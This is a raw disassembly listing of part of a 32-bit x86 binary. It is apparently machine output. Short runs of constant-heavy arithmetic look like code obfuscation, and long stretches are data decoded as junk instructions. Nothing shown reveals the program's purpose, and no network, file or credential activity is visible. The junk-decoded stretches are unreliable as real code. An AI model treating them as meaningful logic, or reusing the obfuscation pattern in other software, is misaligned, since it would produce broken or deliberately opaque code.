  40e4ef:	mov    DWORD PTR [ebp-0x14],0x5215
  40e4f6:	mov    DWORD PTR [ebp+0x8],0x2502
  40e4fd:	mov    eax,DWORD PTR [ebp+0x8]
  40e500:	add    eax,DWORD PTR [ebp-0x14]
  40e503:	mov    ecx,DWORD PTR [ebp-0xc]
  40e506:	and    eax,0x2bab
  40e50b:	lea    eax,[eax+ecx*1-0x557f]
  40e512:	mov    ecx,DWORD PTR [ebp+0xc]
  40e515:	mov    DWORD PTR [esi+eax*4],ecx
  40e518:	mov    DWORD PTR [ebp-0xc],edi
  40e51b:	mov    DWORD PTR [ebp+0x8],0x5f40
  40e522:	mov    DWORD PTR [ebp-0x14],0x6ba4
  40e529:	mov    DWORD PTR [ebp+0xc],0x7b17
  40e530:	mov    ecx,DWORD PTR [ebp+0x8]
  40e533:	jmp    0x40e7c2
  40e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e539:	jno    0x40e4dc
  40e53b:	into   
  40e53c:	mov    ecx,0xb6b9b90d
  40e541:	jb     0x40e5b1
  40e543:	fstp   QWORD PTR [esp]
  40e546:	pusha  
  40e547:	sahf   
  40e548:	int    0x6
  40e54a:	mov    esi,0xbec299be
  40e54f:	mov    esi,0x893d5fe0
  40e554:	ror    ebx,0xc0
  40e557:	or     al,0xae
  40e559:	mov    esp,0x8718c878
  40e55e:	mov    ds:0xbbb06ead,eax
  40e563:	(bad)  
  40e564:	adc    eax,0xda6fb2bb
  40e569:	and    cl,BYTE PTR [ecx]
  40e56b:	pop    ebp
  40e56c:	inc    esp
  40e56d:	loop   0x40e568
  40e56f:	call   0x44e:0xbc9ef42
  40e576:	adc    al,0xa5
  40e578:	retf   0x5650
  40e57b:	mov    al,0xf6
  40e57d:	fdiv   DWORD PTR [ecx-0x21]
  40e580:	cmp    BYTE PTR [esi-0x4a28dab7],al
  40e586:	push   0x75df5351
  40e58b:	or     ebx,esi
  40e58d:	push   edx
  40e58e:	daa    
  40e58f:	call   0xbf3a:0xa4dbe5d8
  40e596:	popf   
  40e597:	mov    bl,0x7d
  40e599:	mov    ah,0x3c
  40e59b:	shr    BYTE PTR ds:0xeee9406a,0x20
  40e5a2:	jmp    0x40e5f8
  40e5a4:	in     eax,dx
  40e5a5:	mov    al,0x4e
  40e5a7:	or     DWORD PTR [eax+0x74],ebp
  40e5aa:	(bad)  [ecx+0x3d]
  40e5ad:	jle    0x40e62d
  40e5af:	scas   al,BYTE PTR es:[edi]
  40e5b0:	loop   0x40e62a
  40e5b2:	mov    ah,BYTE PTR [edi+ebx*4]
  40e5b5:	sbb    eax,DWORD PTR [esi+0x634dbf82]
  40e5bb:	push   ecx
  40e5bc:	dec    esi
  40e5bd:	xor    al,0xdf
  40e5bf:	out    0x92,eax
  40e5c1:	or     al,0xb6
  40e5c3:	jecxz  0x40e60b
  40e5c5:	loop   0x40e5ed
  40e5c7:	ins    BYTE PTR es:[edi],dx
  40e5c8:	fsubp  st(4),st
  40e5ca:	adc    DWORD PTR [edx-0x71f27054],ebx
  40e5d0:	add    DWORD PTR [edi-0x6a236b02],eax
  40e5d6:	daa    
  40e5d7:	jae    0x40e59e
  40e5d9:	pop    esi
  40e5da:	lods   al,BYTE PTR ds:[esi]
  40e5db:	jno    0x40e568
  40e5dd:	mov    ebp,0xf06aa374
  40e5e2:	loope  0x40e617
  40e5e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e5:	mov    BYTE PTR [edx],al
  40e5e7:	xor    BYTE PTR [esi+0x30401955],cl
  40e5ed:	xchg   BYTE PTR [edx+esi*1],ah
  40e5f0:	lods   al,BYTE PTR ds:[esi]
  40e5f1:	xchg   edi,eax
  40e5f2:	jge    0x40e5fa
  40e5f4:	xor    eax,0x26c58f4e
  40e5f9:	and    bh,BYTE PTR [eax+0x6]
  40e5fc:	mov    eax,ds:0x8d654ce9
  40e601:	mov    ebp,0x70cec7
  40e606:	idiv   BYTE PTR [eax+0x2054332c]
  40e60c:	mov    dl,0xaa
  40e60e:	jg     0x40e629
  40e610:	outs   dx,DWORD PTR ds:[esi]
  40e611:	gs mov esp,0xd25aace8
  40e617:	in     al,dx
  40e618:	cmc    
  40e619:	inc    eax
  40e61a:	mov    WORD PTR [ecx],cs
  40e61c:	mov    cl,0x10
  40e61e:	(bad)  
  40e61f:	test   al,0x95
  40e621:	dec    edi
  40e622:	xor    edx,edx
  40e624:	int    0xfc
  40e626:	int    0xbb
  40e628:	mov    bh,0xb2
  40e62a:	push   0xc73b9c1
  40e62f:	imul   esi,DWORD PTR [edi-0x58],0x900bccf9
  40e636:	inc    esp
  40e637:	sbb    dh,ah
  40e639:	inc    esi
  40e63a:	out    0x82,al
  40e63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e63d:	xchg   ebp,eax
  40e63e:	cdq    
  40e63f:	arpl   WORD PTR [ecx],cx
  40e641:	cmp    eax,0xa1c0ae27
  40e646:	aam    0x77
  40e648:	xchg   edx,eax
  40e649:	inc    esp
  40e64a:	xchg   esi,eax
  40e64b:	pop    es
  40e64c:	xor    ebp,ecx
  40e64e:	pushf  
  40e64f:	fst    st(5)
  40e651:	push   cs
  40e652:	mov    ds:0x9243eb4a,al
  40e657:	setb   BYTE PTR [edx+0x7d0978e8]
  40e65e:	std    
  40e65f:	and    BYTE PTR [ecx-0x23],ah
  40e662:	popa   
  40e663:	stos   BYTE PTR es:[edi],al
  40e664:	add    eax,0x6819d49c
  40e669:	test   eax,0x6d62492d
  40e66e:	xor    edx,DWORD PTR [eax-0x27]
  40e671:	inc    eax
  40e672:	or     dl,bl
  40e674:	add    eax,0x8a9a79a0
  40e679:	shr    DWORD PTR [ebp-0x8b3b752],1
  40e67f:	sti    
  40e680:	cwde   
  40e681:	retf   
  40e682:	ds cmp eax,0x24a45981
  40e688:	inc    ecx
  40e689:	xchg   BYTE PTR [edi-0x4a753962],cl
  40e68f:	gs mov eax,0xe3f41535
  40e695:	xchg   DWORD PTR [eax+0x1209010c],edx
  40e69b:	xchg   esp,eax
  40e69c:	scas   eax,DWORD PTR es:[edi]
  40e69d:	adc    edi,eax
  40e69f:	sub    BYTE PTR [esi+0x59f3e759],cl
  40e6a5:	pusha  
  40e6a6:	adc    ah,BYTE PTR [edx]
  40e6a8:	xor    eax,0x3aa0e1f8
  40e6ad:	mov    ebp,0x63e0cd65
  40e6b2:	mov    gs,WORD PTR [ecx-0x54]
  40e6b5:	jmp    0xa6cc:0xd59811e9
  40e6bc:	dec    ebp
  40e6bd:	outs   dx,BYTE PTR ds:[esi]
  40e6be:	mov    BYTE PTR [esi-0x6c87dc65],dl
  40e6c4:	adc    DWORD PTR [edx],esi
  40e6c6:	fdiv   st(0),st
  40e6c8:	jae    0x40e6e2
  40e6ca:	icebp  
  40e6cb:	adc    al,0x23
  40e6cd:	push   ecx
  40e6ce:	cli    
  40e6cf:	cli    
  40e6d0:	pushf  
  40e6d1:	cdq    
  40e6d2:	jmp    0x106aefcc
  40e6d7:	push   ecx
  40e6d8:	aad    0x93
  40e6da:	add    al,0x2d
  40e6dc:	test   eax,0x62a46212
  40e6e1:	cwde   
  40e6e2:	jns    0x40e6f5
  40e6e4:	sbb    dh,BYTE PTR [eax+0x1e]
  40e6e7:	jmp    DWORD PTR [eax+0x6c]
  40e6ea:	push   edi
  40e6eb:	loop   0x40e6de
  40e6ed:	shl    DWORD PTR [edi],1
  40e6ef:	sar    DWORD PTR [eax-0x6026e1ba],0xa1
  40e6f6:	clc    
  40e6f7:	sub    al,0x85
  40e6f9:	pushf  
  40e6fa:	scas   al,BYTE PTR es:[edi]
  40e6fb:	fstp   TBYTE PTR [edi]
  40e6fd:	inc    ebx
  40e6fe:	xchg   ecx,eax
  40e6ff:	out    dx,eax
  40e700:	sub    BYTE PTR [edx],ch
  40e702:	mov    ebx,fs
  40e704:	push   edx
  40e705:	(bad)
  40e709:	in     eax,dx
  40e70a:	mov    dl,0x58
  40e70c:	jae    0x40e707
  40e70e:	retf   
  40e70f:	jno    0x40e78f
  40e711:	push   ds
  40e712:	in     eax,0x43
  40e714:	arpl   WORD PTR [eax],si
  40e716:	inc    esi
  40e717:	jle    0x40e73c
  40e719:	pop    ss
  40e71a:	ret    0x9211
  40e71d:	adc    ebx,DWORD PTR [ebx]
  40e71f:	jge    0x40e79c
  40e721:	push   ecx
  40e722:	pop    edx
  40e723:	hlt    
  40e724:	mov    ds:0x3c16bfa2,eax
  40e729:	dec    ecx
  40e72a:	sub    eax,0x8e422da3
  40e72f:	mov    ebx,0x9c663ba0
  40e734:	aad    0x14
  40e736:	mov    ebp,0x73e0fcbd
  40e73b:	daa    
  40e73c:	mov    ebx,0xba2df4fb
  40e741:	xchg   ebp,eax
  40e742:	lds    ecx,FWORD PTR [edi]
  40e744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e745:	into   
  40e746:	int3   
  40e747:	ins    BYTE PTR es:[edi],dx
  40e748:	iret   
  40e749:	add    eax,0x461509aa
  40e74e:	lock xor BYTE PTR [esi],dl
  40e751:	in     al,0x1b
  40e753:	lea    esp,[esi+0x17]
  40e756:	test   ecx,ebp
  40e758:	add    al,0xad
  40e75a:	outs   dx,BYTE PTR ds:[esi]
  40e75b:	daa    
  40e75c:	pop    edx
  40e75d:	fsubr  DWORD PTR [ecx+0x2774fd8b]
  40e763:	lds    eax,FWORD PTR [edi]
  40e765:	call   0xa40:0x6d7bc1d
  40e76c:	into   
  40e76d:	push   es
  40e76e:	pop    es
  40e76f:	dec    esp
  40e770:	data16 sbb BYTE PTR [eax+0x60a9d855],al
  40e777:	test   eax,0x6864b449
  40e77c:	stos   BYTE PTR es:[edi],al
  40e77d:	fistp  QWORD PTR [esi+0x1846b620]
  40e783:	dec    edx
  40e784:	inc    edx
  40e785:	pushf  
  40e786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e787:	les    ecx,FWORD PTR [edi+0xf6dd679]
  40e78d:	xor    DWORD PTR [ecx*8+0x25f9fd43],ebx
  40e794:	mov    ah,0xc9
  40e796:	dec    ecx
  40e797:	cmp    al,0xeb
  40e799:	pop    edi
  40e79a:	sub    dh,ah
  40e79c:	cmp    ebp,DWORD PTR [ebp-0x3b6cfa5a]
  40e7a2:	dec    edi
  40e7a3:	out    0xd2,al
  40e7a5:	xor    eax,ebx
  40e7a7:	mov    cl,0xc4
  40e7a9:	xchg   ebp,eax
  40e7aa:	jecxz  0x40e7f7
  40e7ac:	(bad)  
  40e7ad:	std    
  40e7ae:	pushf  
  40e7af:	mov    ds:0x7ddf423a,al
  40e7b4:	pop    esi
  40e7b5:	sub    DWORD PTR [ebp-0x39823b88],ebx
  40e7bb:	scas   al,BYTE PTR es:[edi]
  40e7bc:	pop    ecx
  40e7bd:	push   edi
  40e7be:	dec    eax
  40e7bf:	push   ss
  40e7c0:	jmp    0x40e7d9
  40e7c2:	mov    eax,0x43d2
  40e7c7:	sub    eax,ecx
  40e7c9:	add    eax,DWORD PTR [ebp+0xc]
  40e7cc:	xor    edx,edx
  40e7ce:	add    eax,DWORD PTR [ebp-0x14]
  40e7d1:	mov    ecx,DWORD PTR [ebp-0xc]
  40e7d4:	div    ecx
  40e7d6:	mov    ecx,DWORD PTR [ebp+0x10]
  40e7d9:	xor    edx,edx
  40e7db:	pop    edi
  40e7dc:	pop    ebx
  40e7dd:	or     eax,0x67ad
  40e7e2:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  40e7e9:	mov    DWORD PTR [ebp+0x10],0x517b
  40e7f0:	mov    DWORD PTR [ebp+0xc],0x5d62
  40e7f7:	mov    DWORD PTR [ebp+0x8],0x41b0
  40e7fe:	mov    ecx,DWORD PTR [ebp+0x8]
  40e801:	mov    eax,DWORD PTR [ebp+0xc]
  40e804:	and    ecx,0x68c1
  40e80a:	sub    ecx,0x6fd3
  40e810:	or     ecx,eax
  40e812:	mov    eax,DWORD PTR [ebp+0x10]
  40e815:	imul   ecx,eax
  40e818:	mov    eax,0xf52840d5
  40e81d:	div    ecx
  40e81f:	leave  
  40e820:	ret    0xc
  40e823:	push   ebp
  40e824:	mov    ebp,esp
  40e826:	sub    esp,0xc0
  40e82c:	push   esi
  40e82d:	mov    DWORD PTR [ebp-0x80],0x2f93
  40e834:	mov    DWORD PTR [ebp-0x7c],0x3321
  40e83b:	mov    DWORD PTR [ebp-0x70],0x7d00
  40e842:	mov    DWORD PTR [ebp-0x6c],0xd87
  40e849:	jmp    0x40eb8c
  40e84e:	xor    dl,BYTE PTR [ecx]
  40e850:	sub    al,0x76
  40e852:	sub    al,0x78
  40e854:	mov    ah,0x99
  40e856:	sahf   
  40e857:	mov    ?,WORD PTR [eax-0x7fa9c031]
  40e85d:	iret   
  40e85e:	stos   BYTE PTR es:[edi],al
  40e85f:	or     bh,BYTE PTR [esi-0x413bfe42]
  40e865:	mov    esi,0xc1bf1a0e
  40e86a:	fbstp  TBYTE PTR [ecx]
  40e86c:	mov    dl,0xe0
  40e86e:	or     DWORD PTR [ebx-0x70930782],ebx
  40e874:	mov    bl,0x77
  40e876:	xchg   ecx,eax
  40e877:	test   DWORD PTR [ecx],eax
  40e879:	shl    BYTE PTR [edi+0x4],0x65
  40e87d:	mov    eax,0x77b402ec
  40e882:	jb     0x40e87d
  40e884:	pop    ecx
  40e885:	std    
  40e886:	xchg   ecx,eax
  40e887:	push   ds
  40e888:	pop    ss
  40e889:	xor    edi,0xf5d17995
  40e88f:	xchg   cl,ch
  40e891:	outs   dx,BYTE PTR ds:[esi]
  40e892:	ret    
  40e893:	mov    ch,0x2f
  40e895:	mov    esi,0x73055afa
  40e89a:	not    BYTE PTR [eax]
  40e89c:	xchg   ebx,eax
  40e89d:	loopne 0x40e86e
  40e89f:	repz xor eax,0xb49c24f5
  40e8a5:	dec    edi
  40e8a6:	mov    eax,ds:0x313b157d
  40e8ab:	mov    ebx,0x2a1c60c
  40e8b0:	jle    0x40e868
  40e8b2:	aaa    
  40e8b3:	sub    eax,edx
  40e8b5:	fisub  DWORD PTR [eax-0x79]
  40e8b8:	jb     0x40e91a
  40e8ba:	in     al,dx
  40e8bb:	dec    ebx
  40e8bc:	hlt    
  40e8bd:	xor    al,0xc6
  40e8bf:	fldcw  WORD PTR [ecx-0x2f]
  40e8c2:	push   es
  40e8c3:	ins    BYTE PTR es:[edi],dx
  40e8c4:	mov    esp,0x2a409d6c
  40e8c9:	call   0x64fd6efe
  40e8ce:	sahf   
  40e8cf:	dec    ch
  40e8d1:	xchg   ebp,eax
  40e8d2:	(bad)
  40e8d5:	sbb    eax,0xa34590ae
  40e8da:	cmp    DWORD PTR [esi-0x673da0e0],edi
  40e8e0:	jbe    0x40e8d8
  40e8e2:	dec    eax
  40e8e3:	jae    0x40e8ff
  40e8e5:	mov    esi,eax
  40e8e7:	or     bh,bl
  40e8e9:	iret   
  40e8ea:	hlt    
  40e8eb:	xor    al,BYTE PTR [esi]
  40e8ed:	ss (bad) 
  40e8ef:	out    dx,al
  40e8f0:	ror    BYTE PTR [edi+0x43aa27ec],cl
  40e8f6:	lds    edi,FWORD PTR [ecx+0x29]
  40e8f9:	frstor [ecx-0x50]
  40e8fc:	inc    esp
  40e8fd:	jge    0x40e903
  40e8ff:	gs je  0x40e892
  40e902:	scas   al,BYTE PTR es:[edi]
  40e903:	dec    ecx
  40e904:	arpl   dx,bx
  40e906:	ret    
  40e907:	add    cl,cl
  40e909:	pop    edx
  40e90a:	sbb    bl,ah
  40e90c:	inc    bh
  40e90e:	push   ebx
  40e90f:	adc    edi,DWORD PTR [eax]
  40e911:	lea    esp,[edi+edx*4-0xe]
  40e915:	ss in  al,dx
  40e917:	xor    bl,BYTE PTR [edi-0x5e]
  40e91a:	aas    
  40e91b:	outs   dx,BYTE PTR ds:[esi]
  40e91c:	es xchg ebx,eax
  40e91e:	add    eax,0xb1401e8f
  40e923:	sbb    ah,BYTE PTR [esi+0x7e]
  40e926:	fcomp  QWORD PTR [ebx+0x705bfab3]
  40e92c:	(bad)  
  40e92d:	mov    ah,0xa0
  40e92f:	int    0xf8
  40e931:	cmp    cl,ch
  40e933:	ror    DWORD PTR [eax-0x76035604],0xf3
  40e93a:	retf   
  40e93b:	enter  0xd5e6,0x13
  40e93f:	adc    DWORD PTR ss:[edx-0x3b983833],ebp
  40e946:	nop
  40e947:	mov    ebp,0x7ce7aac9
  40e94c:	push   cs
  40e94d:	shl    DWORD PTR [edx+eax*2+0x4d],1
  40e951:	fnstenv [eax]
  40e953:	bound  ebx,QWORD PTR [eax+0x2786f18d]
  40e959:	and    DWORD PTR [eax+0x17c336ba],0xffffffd6
  40e960:	repz adc dh,BYTE PTR [ebp+ebx*4+0x198674c9]
  40e968:	sub    BYTE PTR [eax+0x62c84039],dl
  40e96e:	call   FWORD PTR [esp+ebp*2-0x2e]
  40e972:	xor    ebx,DWORD PTR [edx]
  40e974:	push   esi
  40e975:	out    0xaf,eax
  40e977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e978:	stc    
  40e979:	xlat   BYTE PTR ds:[ebx]
  40e97a:	xor    edi,ebp
  40e97c:	pop    esi
  40e97d:	lods   al,BYTE PTR ds:[esi]
  40e97e:	repnz and esp,eax
  40e981:	div    DWORD PTR [ebx-0x1b]
  40e984:	mov    ebp,ebx
  40e986:	int3   
  40e987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e988:	mov    edx,0xa761837c
  40e98d:	inc    ebx
  40e98e:	adc    ch,BYTE PTR [edi-0x34]
  40e991:	xchg   bh,dh
  40e993:	add    al,0xb4
  40e995:	or     eax,0x9ca6f964
  40e99a:	sub    BYTE PTR [esi+0xae2e22a],bh
  40e9a0:	pop    ebx
  40e9a1:	dec    esi
  40e9a2:	sbb    eax,0x2ceaba94
  40e9a7:	aad    0x33
  40e9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9aa:	pop    esi
  40e9ab:	or     eax,0x9e18d9d2
  40e9b0:	lods   al,BYTE PTR ds:[esi]
  40e9b1:	inc    esp
  40e9b2:	sub    edx,edx
  40e9b4:	jl     0x40e997
  40e9b6:	aad    0xa6
  40e9b8:	dec    ecx
  40e9b9:	jnp    0x40ea36
  40e9bb:	arpl   si,bp
  40e9bd:	loopne 0x40ea20
  40e9bf:	test   eax,0x7bf8b5ab
  40e9c5:	add    DWORD PTR ds:0xd5b03ea2,esp
  40e9cb:	push   edx
  40e9cc:	in     al,dx
  40e9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9ce:	stos   BYTE PTR es:[edi],al
  40e9cf:	inc    eax
  40e9d0:	lods   eax,DWORD PTR ds:[esi]
  40e9d1:	arpl   WORD PTR [ebp-0x25],dx
  40e9d4:	mov    ebx,0x44fb3058
  40e9d9:	scas   al,BYTE PTR es:[edi]
  40e9da:	mov    bl,BYTE PTR [ecx]
  40e9dc:	test   eax,0x80fd5209
  40e9e1:	sbb    eax,0xa3a805c6
  40e9e6:	pop    edx
  40e9e7:	clc    
  40e9e8:	xchg   ecx,eax
  40e9e9:	xchg   ebp,eax
  40e9ea:	push   esp
  40e9eb:	or     DWORD PTR [ecx+0x6c6e71e1],esi
  40e9f1:	ja     0x40ea4c
  40e9f3:	jns    0x40e9cc
  40e9f5:	pushf  
  40e9f6:	and    DWORD PTR [esi-0x43560928],eax
  40e9fc:	xchg   DWORD PTR [esi+0x6a],ecx
  40e9ff:	loop   0x40ea23
  40ea01:	pop    ss
  40ea02:	mov    bh,0xc2
  40ea04:	jns    0x40ea12
  40ea06:	adc    al,0x6c
  40ea08:	mov    edi,0x4879a9c3
  40ea0d:	retf   0xd72
  40ea10:	add    al,BYTE PTR [ecx]
  40ea12:	jge    0x40ea4a
  40ea14:	fwait
  40ea15:	mov    ds,WORD PTR [edi-0x52]
  40ea18:	xor    al,0x32
  40ea1a:	and    eax,0x8baafc77
  40ea1f:	ins    DWORD PTR es:[edi],dx
  40ea20:	inc    esp
  40ea21:	call   0xd135:0xd1514437
  40ea28:	cmp    al,0x80
  40ea2a:	pop    ds
  40ea2b:	fs test eax,0xe2ae970d
  40ea31:	test   DWORD PTR ds:0x63a5b5de,ecx
  40ea37:	push   0x73903029
  40ea3c:	nop
  40ea3d:	sahf   
  40ea3e:	cli    
  40ea3f:	repnz and esi,ecx
  40ea42:	retf   0xe5b6
  40ea45:	or     dh,BYTE PTR [eax]
  40ea47:	in     eax,dx
  40ea48:	xor    ebp,DWORD PTR [edx]
  40ea4a:	pop    ss
  40ea4b:	jmp    0x40ea3d
  40ea4d:	std    
  40ea4e:	cld    
  40ea4f:	adc    bh,BYTE PTR [edx]
  40ea51:	fwait
  40ea52:	sbb    al,0xbc
  40ea54:	sub    ecx,DWORD PTR [ecx+0x658e68c2]
  40ea5a:	stos   DWORD PTR es:[edi],eax
  40ea5b:	popa   
  40ea5c:	rol    DWORD PTR [edi],cl
  40ea5e:	(bad)
  40ea62:	aaa    
  40ea63:	je     0x40ea4a
  40ea65:	xlat   BYTE PTR ds:[ebx]
  40ea66:	pop    ss
  40ea67:	test   eax,0x66b8539b
  40ea6c:	cmp    BYTE PTR [ebx-0x49f4b343],bl
  40ea72:	and    eax,0xf56c438c
  40ea77:	push   0x6f446055
  40ea7c:	scas   al,BYTE PTR es:[edi]
  40ea7d:	cmp    DWORD PTR [ebp+0x6d414b12],0xa50325a3
  40ea87:	add    eax,eax
  40ea89:	adc    edi,DWORD PTR [eax]
  40ea8b:	push   cs
  40ea8c:	add    al,0x7f
  40ea8e:	test   eax,0x780b27e1
  40ea93:	sbb    eax,0xadd6fd11
  40ea98:	xor    DWORD PTR [esp+edi*4+0x4a],esi
  40ea9c:	pop    es
  40ea9d:	or     BYTE PTR [esi],bh
  40ea9f:	mov    WORD PTR [eax],?
  40eaa1:	and    al,0xdf
  40eaa3:	mov    ds:0x75a69a8b,eax
  40eaa9:	xchg   edx,eax
  40eaaa:	int3   
  40eaab:	jle    0x40ea4e
  40eaad:	ja     0x40eb2d
  40eaaf:	jno    0x40eabf
  40eab1:	dec    edx
  40eab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eab3:	jae    0x40eb34
  40eab5:	mov    ebx,0x51822e6f
  40eaba:	call   0x68a9d430
  40eabf:	add    BYTE PTR [ecx],0xeb
  40eac2:	shl    DWORD PTR [edx-0x27],0x6a
  40eac6:	call   0xb6fc:0xaf170134
  40eacd:	inc    edi
  40eace:	scas   eax,DWORD PTR es:[edi]
  40eacf:	pop    ds
  40ead0:	mov    ebx,0xcdb2e13f
  40ead5:	push   esp
  40ead6:	adc    ecx,edx
  40ead8:	arpl   WORD PTR [edx],dx
  40eada:	pushf  
  40eadb:	jnp    0x40ea5f
  40eadd:	mov    ecx,0x7786b4a9
  40eae2:	xchg   esi,eax
  40eae3:	xchg   DWORD PTR [ecx],ebx
  40eae5:	sub    DWORD PTR [ecx-0x48],ebp
  40eae8:	jae    0x40eb0c
  40eaea:	loop   0x40eb1f
  40eaec:	stos   BYTE PTR es:[edi],al
  40eaed:	pop    ecx
  40eaee:	cmp    BYTE PTR [ecx-0x1c],0x9a
  40eaf2:	call   0x73a5:0xc6298fb8
  40eaf9:	lea    ebx,[eax+0x7b9b10b6]
  40eaff:	call   0xa3b5fce5
  40eb04:	mov    esp,0xf1e254bf
  40eb09:	repnz test bl,dh
  40eb0c:	mov    ds:0x95dff354,al
  40eb11:	fldcw  WORD PTR [ebp-0xb673ca5]
  40eb17:	pop    edi
  40eb18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb19:	cmp    DWORD PTR [ecx],0x7c
  40eb1c:	ds in  eax,dx
  40eb1e:	jge    0x40eae1
  40eb20:	sar    DWORD PTR [edi+edx*2+0x17ab5b2b],cl
  40eb27:	sbb    DWORD PTR [eax+0x3d],ebx
  40eb2a:	call   0x4a49e1ce
  40eb2f:	push   cs
  40eb30:	sub    eax,0x6e2aaeff
  40eb35:	jo     0x40eaeb
  40eb37:	jecxz  0x40eba0
  40eb39:	pop    esi
  40eb3a:	xchg   ebp,eax
  40eb3b:	add    BYTE PTR [ebp+0x26454648],0xd
  40eb42:	loope  0x40eb98
  40eb44:	mov    BYTE PTR ds:0x9fc2d8c0,al
  40eb4a:	mov    es,WORD PTR [esi+0x2755520e]
  40eb50:	jne    0x40eb48
  40eb52:	(bad)  
  40eb54:	mov    ebx,0xbc138dd2
  40eb59:	xchg   esi,eax
  40eb5a:	push   0xeeff64d0
  40eb5f:	in     eax,0xe3
  40eb61:	jb     0x40eb7a
  40eb63:	repnz retf 
  40eb65:	xchg   ecx,eax
  40eb66:	jmp    0x185365d5
  40eb6b:	push   DWORD PTR [eax]
  40eb6d:	loopne 0x40eb44
  40eb6f:	gs or  al,0x31
  40eb72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb73:	mov    ch,0xa9
  40eb75:	or     eax,edx
  40eb77:	mov    bl,0x7
  40eb79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7a:	sub    bh,BYTE PTR ds:0x8b7240cf
  40eb80:	jmp    0x64b8:0x80db613e
  40eb87:	pop    eax
  40eb88:	pushf  
  40eb89:	push   ds
  40eb8a:	ins    BYTE PTR es:[edi],dx
  40eb8b:	add    eax,0x97a045c7
  40eb90:	inc    ecx
  40eb91:	add    BYTE PTR [eax],al
  40eb93:	mov    DWORD PTR [ebp-0x5c],0xa7d
  40eb9a:	mov    DWORD PTR [ebp-0x50],0x772d
  40eba1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  40eba8:	mov    DWORD PTR [ebp-0x40],0x414a
  40ebaf:	mov    DWORD PTR [ebp-0x3c],0x55ef
  40ebb6:	mov    DWORD PTR [ebp-0x30],0x136b
  40ebbd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  40ebc4:	mov    DWORD PTR [ebp-0x20],0x32d8
  40ebcb:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  40ebd2:	mov    DWORD PTR [ebp-0xc],0x3956
  40ebd9:	mov    DWORD PTR [ebp-0xa4],0x4e57
  40ebe3:	mov    DWORD PTR [ebp-0x94],0x1
  40ebed:	mov    DWORD PTR [ebp-0x14],0x17ab
  40ebf4:	mov    DWORD PTR [ebp-0x64],0x7a3d
  40ebfb:	mov    DWORD PTR [ebp-0x54],0x378a
  40ec02:	mov    DWORD PTR [ebp-0x74],0x5a00
  40ec09:	mov    DWORD PTR [ebp-0x24],0x1f3a
  40ec10:	mov    DWORD PTR [ebp-0x84],0x9a225
  40ec1a:	mov    DWORD PTR [ebp-0x44],0x31f8
  40ec21:	mov    DWORD PTR [ebp-0x34],0x3663
  40ec28:	mov    DWORD PTR [ebp-0xb4],0x3165
  40ec32:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  40ec3c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  40ec46:	mov    DWORD PTR [ebp-0xb0],0x7564
  40ec50:	mov    DWORD PTR [ebp-0xac],0x18cf
  40ec5a:	mov    DWORD PTR [ebp-0xa0],0x3135
  40ec64:	mov    DWORD PTR [ebp-0x9c],0x568d
  40ec6e:	mov    DWORD PTR [ebp-0x90],0x11f2
  40ec78:	mov    DWORD PTR [ebp-0x8c],0x63ea
  40ec82:	mov    DWORD PTR [ebp-0x10],0x3066
  40ec89:	mov    DWORD PTR [ebp-0x8],0x6ed2
  40ec90:	push   0x7e1d
  40ec95:	mov    DWORD PTR [ebp-0x4],0x30f4
  40ec9c:	mov    eax,DWORD PTR [ebp-0x20]
  40ec9f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40eca2:	push   0x5380
  40eca7:	push   ecx
  40eca8:	push   eax
  40eca9:	call   0x41594e
  40ecae:	mov    ecx,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x30]
  40ecb3:	xor    ecx,eax
  40ecb5:	mov    esi,edx
  40ecb7:	mov    edx,DWORD PTR [ebp-0x2c]
  40ecba:	mov    eax,DWORD PTR [ebp-0x40]
  40ecbd:	xor    esi,edx
  40ecbf:	mov    edx,DWORD PTR [ebp-0x3c]
  40ecc2:	xor    ecx,0xf3a
  40ecc8:	or     ecx,eax
  40ecca:	mov    eax,ds:0x422708
  40eccf:	mov    eax,DWORD PTR [eax+0x1d8]
  40ecd5:	mov    eax,DWORD PTR [eax]
  40ecd7:	xor    esi,0x6665
  40ecdd:	or     esi,edx
  40ecdf:	add    ecx,0xef6a96a5
  40ece5:	cdq    
  40ece6:	adc    esi,0xc8b6a000
  40ecec:	cmp    eax,ecx
  40ecee:	jne    0x40ecfc
  40ecf4:	cmp    edx,esi
  40ecf6:	je     0x40ed5b
  40ecfc:	mov    eax,DWORD PTR [ebp-0x50]
  40ecff:	mov    ecx,DWORD PTR [ebp-0x4c]
  40ed02:	mov    edx,DWORD PTR [ebp-0x60]
  40ed05:	mov    esi,DWORD PTR [ebp-0x5c]
  40ed08:	add    eax,0x7818
  40ed0d:	adc    ecx,0x87
  40ed13:	or     eax,edx
  40ed15:	mov    edx,DWORD PTR [ebp-0x70]
  40ed18:	or     ecx,esi
  40ed1a:	mov    esi,DWORD PTR [ebp-0x6c]
  40ed1d:	push   esi
  40ed1e:	push   edx
  40ed1f:	push   ecx
  40ed20:	push   eax
  40ed21:	call   0x41594e
  40ed26:	mov    ecx,DWORD PTR [ebp-0x80]
  40ed29:	mov    esi,DWORD PTR [ebp-0x7c]
  40ed2c:	and    eax,ecx
  40ed2e:	mov    ecx,DWORD PTR ds:0x422708
  40ed34:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40ed3a:	mov    ecx,DWORD PTR [ecx]
  40ed3c:	and    edx,esi
  40ed3e:	xor    eax,0x2b01
